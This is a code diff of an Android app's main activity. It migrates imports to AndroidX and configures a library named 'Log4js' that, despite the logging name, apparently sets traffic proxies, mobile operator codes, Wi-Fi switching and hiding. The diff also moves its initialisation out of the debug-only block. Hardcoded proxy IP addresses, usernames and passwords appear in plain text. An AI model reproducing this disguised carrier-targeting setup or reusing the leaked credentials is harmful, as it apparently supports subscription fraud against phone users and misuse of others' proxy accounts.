@@ -1,7 +1,7 @@
 package com.mos.molisub;
 
-import android.support.annotation.NonNull;
-import android.support.v7.app.AppCompatActivity;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Log;
 
@@ -23,25 +23,14 @@ public class MainActivity extends AppCompatActivity implements LogEvent {
         setContentView(R.layout.activity_main);
 
         if (BuildConfig.DEBUG) {
-//            SubProxy proxy = HostUtil.proxy();
-//            this.setProxy(new SubProxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 11246));
-//            Log4js.INSTANCE.proxy("91.220.77.154", "mauritius", "precpx123", 8090);
-//            Log4js.proxy(proxy.getHost(), proxy.getUsername(), proxy.getPassword(), proxy.getPort());
-//            Log4js.proxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 10031);
+            Log4js.INSTANCE.proxy("91.220.77.154", "mauritius", "precpx123", 8090);
+//            Log4js.INSTANCE.proxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 10031);
             Log4js.INSTANCE.log(true);
-            Log4js.INSTANCE.closeWifi(false);
+//            Log4js.INSTANCE.closeWifi(false);
+            Log4js.INSTANCE.operator("26202");
 //            Log4js.setHiden(false);
-            Log4js.INSTANCE.operator("23210");
-//            Log4js.operator("26806");
-//            Log4js.operator("23201");
-            //H3G
-//            Log4js.operator("23205");
-//            Log4js.operator("26206");
-            Log4js.INSTANCE.init(this);
         }
-
-
-//        Log4js.buildNotificationAlert("标题", "该应用需要授权读取通知权限", "确定", "取消");
+        Log4js.INSTANCE.init(this);
     }
 
 
